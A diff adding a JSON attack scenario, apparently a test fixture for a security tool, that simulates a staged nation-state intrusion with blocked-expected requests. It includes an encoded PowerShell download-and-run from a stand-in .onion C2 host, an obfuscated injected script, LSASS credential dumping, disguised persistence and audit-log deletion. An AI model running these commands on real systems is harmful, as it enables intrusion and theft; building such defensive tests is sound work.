@@ -1,0 +1,430 @@
+{
+  "id": "advanced-persistent-threat",
+  "name": "Advanced Persistent Threat (APT)",
+  "category": "Nation-State Operations",
+  "difficulty": "Expert",
+  "description": "Ultra-sophisticated nation-state level attack featuring long-term reconnaissance, lateral movement techniques, compliance system evasion, audit trail manipulation, and multi-vector coordination with advanced persistence mechanisms",
+  "tags": [
+    "apt",
+    "lateral-movement",
+    "compliance-evasion",
+    "audit-manipulation",
+    "multi-vector"
+  ],
+  "steps": [
+    {
+      "id": "apt-stealth-recon-1",
+      "name": "Passive Infrastructure Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/robots.txt",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+          "Accept": "text/plain, */*"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      }
+    },
+    {
+      "id": "apt-advanced-recon-1",
+      "name": "Advanced Reconnaissance - Certificate Transparency",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/recon/advanced",
+        "headers": {
+          "User-Agent": "CertificateTransparency-Monitor/2.0",
+          "Accept": "application/json"
+        },
+        "params": {
+          "type": "certificate_transparency",
+          "domain": "*.target.com",
+          "subdomain_enum": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "dependsOn": [
+        "apt-stealth-recon-1"
+      ]
+    },
+    {
+      "id": "apt-osint-gathering-1",
+      "name": "OSINT Gathering - Employee Intelligence",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/directory/public",
+        "headers": {
+          "User-Agent": "LinkedInBot/1.0 (compatible; Mozilla/5.0; +https://www.linkedin.com/)",
+          "Accept": "application/json"
+        },
+        "params": {
+          "search": "engineering security devops",
+          "linkedin_correlation": "true",
+          "github_analysis": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 7200
+      },
+      "dependsOn": [
+        "apt-advanced-recon-1"
+      ]
+    },
+    {
+      "id": "apt-supply-chain-recon-1",
+      "name": "Supply Chain Reconnaissance",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/api/dependencies/scan",
+        "headers": {
+          "User-Agent": "Dependabot/1.0 (GitHub; +https://docs.github.com/dependabot)",
+          "Accept": "application/json"
+        },
+        "params": {
+          "type": "npm,pypi,maven,docker",
+          "vulnerability_correlation": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 9600
+      },
+      "dependsOn": [
+        "apt-osint-gathering-1"
+      ]
+    },
+    {
+      "id": "apt-watering-hole-1",
+      "name": "Watering Hole Preparation",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/cdn/resource/modify",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "CDN-Management/2.1 (CloudFlare)",
+          "Authorization": "Bearer compromised_cdn_token"
+        },
+        "body": "{\"resource_url\": \"https://trusted-industry-site.com/js/analytics.js\", \"modification\": \"append\", \"payload\": \"eval(atob('dmFyIGk9bmV3IEltYWdlKCk7aS5zcmM9J2h0dHBzOi8vYXB0LWMy'));\", \"target_user_agents\": [\"*target-company*\"]}"
+      },
+      "execution": {
+        "delayMs": 12000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-supply-chain-recon-1"
+      ]
+    },
+    {
+      "id": "apt-spear-phishing-1",
+      "name": "Spear Phishing with Social Engineering",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/email/send",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"to\": \"cto@target.com\", \"from\": \"security@trusted-partner.com\", \"subject\": \"Urgent: Security Audit Results - Action Required\", \"body\": \"Please review the attached security audit results immediately\", \"attachment\": \"audit-report.pdf.exe\", \"spoof_sender\": true, \"bypass_spf_dkim\": true}"
+      },
+      "execution": {
+        "delayMs": 14400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-watering-hole-1"
+      ]
+    },
+    {
+      "id": "apt-initial-compromise-1",
+      "name": "Initial System Compromise via Zero-Day",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/upload/document",
+        "headers": {
+          "Content-Type": "multipart/form-data",
+          "User-Agent": "Microsoft Office/16.0 (Windows NT 10.0; WOW64)"
+        },
+        "body": "Content-Disposition: form-data; name=\"file\"; filename=\"quarterly-report.docx\"\r\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\r\n\r\nPK\u0003\u0004ZERO_DAY_EXPLOIT_CVE_2024_UNKNOWN_PAYLOAD_HERE"
+      },
+      "execution": {
+        "delayMs": 16800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-spear-phishing-1"
+      ]
+    },
+    {
+      "id": "apt-living-off-land-1",
+      "name": "Living Off The Land - PowerShell Abuse",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/system/execute",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer system_service_token"
+        },
+        "body": "{\"command\": \"powershell.exe\", \"args\": [\"-ExecutionPolicy\", \"Bypass\", \"-WindowStyle\", \"Hidden\", \"-EncodedCommand\", \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBjADIALQBzAGUAYwB1AHIAZQAuAG8AbgBpAG8AbgAvAGYAaQByAHMAdABzAHQAYQBnAGUAIgApAA==\"], \"hide_process\": true}"
+      },
+      "execution": {
+        "delayMs": 19200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-initial-compromise-1"
+      ]
+    },
+    {
+      "id": "apt-lateral-movement-1",
+      "name": "Lateral Movement via SMB Relay",
+      "stage": "lateral-movement",
+      "request": {
+        "method": "POST",
+        "url": "/api/lateral/movement",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"protocol\": \"smb\", \"target_hosts\": [\"10.0.1.0/24\", \"192.168.1.0/24\"], \"relay_attack\": true, \"ntlm_capture\": true, \"tools\": [\"impacket\", \"responder\"], \"credentials\": {\"username\": \"domain\\\\admin\", \"hash\": \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\"}}"
+      },
+      "execution": {
+        "delayMs": 21600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-living-off-land-1"
+      ]
+    },
+    {
+      "id": "apt-credential-dumping-1",
+      "name": "Credential Dumping via LSASS",
+      "stage": "credential-access",
+      "request": {
+        "method": "POST",
+        "url": "/api/memory/dump",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Process-Name": "lsass.exe"
+        },
+        "body": "{\"process\": \"lsass.exe\", \"dump_method\": \"minidump\", \"edr_bypass\": true, \"tools\": [\"mimikatz\", \"procdump\", \"pypykatz\"], \"output_encryption\": true, \"steganography\": \"hide_in_legit_files\"}"
+      },
+      "execution": {
+        "delayMs": 24000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-lateral-movement-1"
+      ]
+    },
+    {
+      "id": "apt-persistence-services-1",
+      "name": "Service-Based Persistence",
+      "stage": "persistence",
+      "request": {
+        "method": "PUT",
+        "url": "/api/services/create",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"service_name\": \"WindowsSecurityHealthService\", \"display_name\": \"Windows Security Health Service\", \"description\": \"Provides security health monitoring for the system\", \"binary_path\": \"C:\\\\Windows\\\\System32\\\\svchost.exe -k LocalServiceNetworkRestricted -p -s SecurityHealthService\", \"start_type\": \"automatic\", \"account\": \"LocalSystem\", \"hidden_payload\": \"https://c2-backup.onion/stage3\"}"
+      },
+      "execution": {
+        "delayMs": 26400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-credential-dumping-1"
+      ]
+    },
+    {
+      "id": "apt-compliance-evasion-1",
+      "name": "Compliance System Evasion",
+      "stage": "defense-evasion",
+      "request": {
+        "method": "POST",
+        "url": "/api/compliance/bypass",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer compliance_admin_token"
+        },
+        "body": "{\"framework\": [\"SOX\", \"HIPAA\", \"PCI-DSS\", \"ISO27001\"], \"evasion_methods\": [\"log_rotation_manipulation\", \"audit_timestamp_drift\", \"control_exception_abuse\"], \"maintain_compliance_appearance\": true, \"create_false_positives\": true}"
+      },
+      "execution": {
+        "delayMs": 28800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-persistence-services-1"
+      ]
+    },
+    {
+      "id": "apt-audit-manipulation-1",
+      "name": "Audit Trail Manipulation",
+      "stage": "defense-evasion",
+      "request": {
+        "method": "DELETE",
+        "url": "/api/audit/trails",
+        "headers": {
+          "Authorization": "Bearer audit_management_token",
+          "X-Audit-Bypass": "maintenance_mode"
+        },
+        "params": {
+          "time_range": "last_72_hours",
+          "event_categories": "authentication,privilege_use,object_access,policy_change",
+          "selective_deletion": "true",
+          "preserve_benign_events": "true"
+        }
+      },
+      "execution": {
+        "delayMs": 31200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-compliance-evasion-1"
+      ]
+    },
+    {
+      "id": "apt-data-staging-1",
+      "name": "Sensitive Data Staging",
+      "stage": "collection",
+      "request": {
+        "method": "POST",
+        "url": "/api/data/collect",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"targets\": [\"financial_records\", \"customer_data\", \"intellectual_property\", \"strategic_plans\"], \"staging_location\": \"encrypted_shadow_directory\", \"compression\": \"maximum\", \"encryption\": \"AES-256-GCM\", \"steganography\": \"embed_in_system_files\"}"
+      },
+      "execution": {
+        "delayMs": 33600
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-audit-manipulation-1"
+      ]
+    },
+    {
+      "id": "apt-covert-channel-1",
+      "name": "Covert Channel Communication",
+      "stage": "command-control",
+      "request": {
+        "method": "GET",
+        "url": "/api/dns/query",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        },
+        "params": {
+          "domain": "legitimate-looking-domain.com",
+          "type": "TXT",
+          "covert_channel": "dns_tunneling"
+        }
+      },
+      "execution": {
+        "delayMs": 36000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-data-staging-1"
+      ]
+    },
+    {
+      "id": "apt-multi-vector-coordination-1",
+      "name": "Multi-Vector Attack Coordination",
+      "stage": "coordination",
+      "request": {
+        "method": "POST",
+        "url": "/api/coordination",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Coordination-Key": "apt_master_key_2024"
+        },
+        "body": "{\"attack_vectors\": [\"network\", \"email\", \"web\", \"social\", \"supply_chain\"], \"timing_synchronization\": true, \"target_prioritization\": {\"executives\": 10, \"it_admin\": 9, \"developers\": 8}, \"coordination_protocol\": \"encrypted_p2p\", \"fallback_c2\": [\"https://backup-c2.onion\", \"dns://covert.example.com\"]}"
+      },
+      "execution": {
+        "delayMs": 38400
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-covert-channel-1"
+      ]
+    },
+    {
+      "id": "apt-exfiltration-staged-1",
+      "name": "Multi-Stage Data Exfiltration",
+      "stage": "exfiltration",
+      "request": {
+        "method": "POST",
+        "url": "/api/backup/encrypted",
+        "headers": {
+          "Content-Type": "application/octet-stream",
+          "Authorization": "Bearer backup_service_token",
+          "X-Backup-Type": "incremental"
+        },
+        "body": "ENCRYPTED_STAGED_DATA_PAYLOAD_DISGUISED_AS_LEGITIMATE_BACKUP_PROCESS"
+      },
+      "execution": {
+        "delayMs": 40800
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-multi-vector-coordination-1"
+      ]
+    },
+    {
+      "id": "apt-dormancy-implant-1",
+      "name": "Long-Term Dormancy Implant",
+      "stage": "persistence",
+      "request": {
+        "method": "PUT",
+        "url": "/api/system/task-scheduler",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"task_name\": \"SystemMaintenanceHealthCheck\", \"description\": \"Performs routine system health monitoring\", \"trigger\": {\"type\": \"daily\", \"time\": \"03:00\", \"random_delay\": \"PT2H\"}, \"action\": {\"executable\": \"powershell.exe\", \"arguments\": \"-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <DORMANT_PAYLOAD_BASE64>\"}, \"settings\": {\"hidden\": true, \"run_only_if_network_available\": true, \"wake_to_run\": false}}"
+      },
+      "execution": {
+        "delayMs": 43200
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "apt-exfiltration-staged-1"
+      ]
+    }
+  ]
+}
